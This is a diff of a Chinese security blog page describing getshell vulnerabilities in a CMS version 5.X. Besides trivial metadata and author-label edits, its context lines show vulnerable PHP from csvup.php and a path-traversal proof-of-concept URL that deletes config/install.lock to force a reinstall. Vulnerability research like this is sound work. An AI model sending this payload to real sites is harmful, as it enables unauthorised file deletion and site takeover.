@@ -90,18 +90,18 @@
 
 
 
-<meta name="description" content="0x00 前言首发于：先知社区: 某CMS 5.X版本GETSHELL漏洞合集2018年1月底某CMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。 0x01安装过程过滤不严导致Getshell前提:有删除/config/install.lock权限 1. 结合网上爆出某CMS 的后台任意文件删除漏洞123456789101">
+<meta name="description" content="0x00 前言首发于：先知社区: 某CMS 5.X版本GETSHELL漏洞合集2018年1月底某CMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。">
 <meta name="keywords" content="PHP,代码审计,Security">
 <meta property="og:type" content="article">
 <meta property="og:title" content="某CMS5.X版本GETSHELL漏洞合集-五连杀">
 <meta property="og:url" content="http://blackwolfsec.cc/2018/03/13/5_x_getshell/index.html">
 <meta property="og:site_name" content="BlackWolfsec">
-<meta property="og:description" content="0x00 前言首发于：先知社区: 某CMS 5.X版本GETSHELL漏洞合集2018年1月底某CMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。 0x01安装过程过滤不严导致Getshell前提:有删除/config/install.lock权限 1. 结合网上爆出某CMS 的后台任意文件删除漏洞123456789101">
+<meta property="og:description" content="0x00 前言首发于：先知社区: 某CMS 5.X版本GETSHELL漏洞合集2018年1月底某CMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-04-09T01:50:51.053Z">
+<meta property="og:updated_time" content="2018-04-25T00:54:00.157Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="某CMS5.X版本GETSHELL漏洞合集-五连杀">
-<meta name="twitter:description" content="0x00 前言首发于：先知社区: 某CMS 5.X版本GETSHELL漏洞合集2018年1月底某CMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。 0x01安装过程过滤不严导致Getshell前提:有删除/config/install.lock权限 1. 结合网上爆出某CMS 的后台任意文件删除漏洞123456789101">
+<meta name="twitter:description" content="0x00 前言首发于：先知社区: 某CMS 5.X版本GETSHELL漏洞合集2018年1月底某CMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。">
 
 
 
@@ -312,7 +312,7 @@
     <link itemprop="mainEntityOfPage" href="http://blackwolfsec.cc/2018/03/13/5_x_getshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="admin@blackwolfsec.cc">
+      <meta itemprop="name" content="邮箱地址：admin@blackwolfsec.cc">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/static/picture/logo.jpg">
     </span>
@@ -400,7 +400,7 @@
       
 
       
-        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>首发于：<a href="https://xz.aliyun.com/t/2096" target="_blank" rel="noopener">先知社区: 某CMS 5.X版本GETSHELL漏洞合集</a><br>2018年1月底某CMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。</p>
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>首发于：<a href="https://xz.aliyun.com/t/2096" target="_blank" rel="noopener">先知社区: 某CMS 5.X版本GETSHELL漏洞合集</a><br>2018年1月底某CMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。<br><a id="more"></a></p>
 <h2 id="0x01安装过程过滤不严导致Getshell"><a href="#0x01安装过程过滤不严导致Getshell" class="headerlink" title="0x01安装过程过滤不严导致Getshell"></a>0x01安装过程过滤不严导致Getshell</h2><p><em>前提:有删除/config/install.lock权限</em></p>
 <h3 id="1-结合网上爆出某CMS-的后台任意文件删除漏洞"><a href="#1-结合网上爆出某CMS-的后台任意文件删除漏洞" class="headerlink" title="1. 结合网上爆出某CMS 的后台任意文件删除漏洞"></a>1. 结合网上爆出某CMS 的后台任意文件删除漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#/admin/app/batch/csvup.php</span></span><br><span class="line"></span><br><span class="line">$classflie=explode(<span class="string">'_'</span>,$fileField);</span><br><span class="line">$classflie=explode(<span class="string">'-'</span>,$classflie[count($classflie)<span class="number">-1</span>]);</span><br><span class="line">$class1=$classflie[<span class="number">0</span>];</span><br><span class="line">$class2=$classflie[<span class="number">1</span>];</span><br><span class="line">$class3=$classflie[<span class="number">2</span>];</span><br><span class="line">$class=$class3?$class3:($class2?$class2:$class1); </span><br><span class="line">$classcsv=$db-&gt;get_one(<span class="string">"select * from $met_column where id=$class"</span>);</span><br><span class="line"><span class="keyword">if</span>(!$classcsv)&#123;</span><br><span class="line">metsave(<span class="string">"../app/batch/contentup.php?anyid=$anyid&amp;lang=$lang"</span>,$lang_csvnocolumn,$depth);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 省略代码</span></span><br><span class="line"></span><br><span class="line">@file_unlink($flienamecsv);</span><br></pre></td></tr></table></figure>
 <p>删除/config/install.lock文件可以导致重装（需要由对应的删除权限），删除文件的poc如下：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>xxx.com<span class="regexp">/admin/</span>app<span class="regexp">/batch/</span>csvup.php?fileField=<span class="number">1</span>_1231-<span class="number">1</span>&amp;flienamecsv=..<span class="regexp">/../</span>..<span class="regexp">/config/i</span>nstall.lock</span><br></pre></td></tr></table></figure></p>
@@ -570,8 +570,8 @@
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/static/picture/logo.jpg"
-               alt="admin@blackwolfsec.cc" />
-          <p class="site-author-name" itemprop="name">admin@blackwolfsec.cc</p>
+               alt="邮箱地址：admin@blackwolfsec.cc" />
+          <p class="site-author-name" itemprop="name">邮箱地址：admin@blackwolfsec.cc</p>
            
               <p class="site-description motion-element" itemprop="description"></p>
           
@@ -757,7 +757,7 @@
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">admin@blackwolfsec.cc</span>
+  <span class="author" itemprop="copyrightHolder">邮箱地址：admin@blackwolfsec.cc</span>
 </div>
 
 
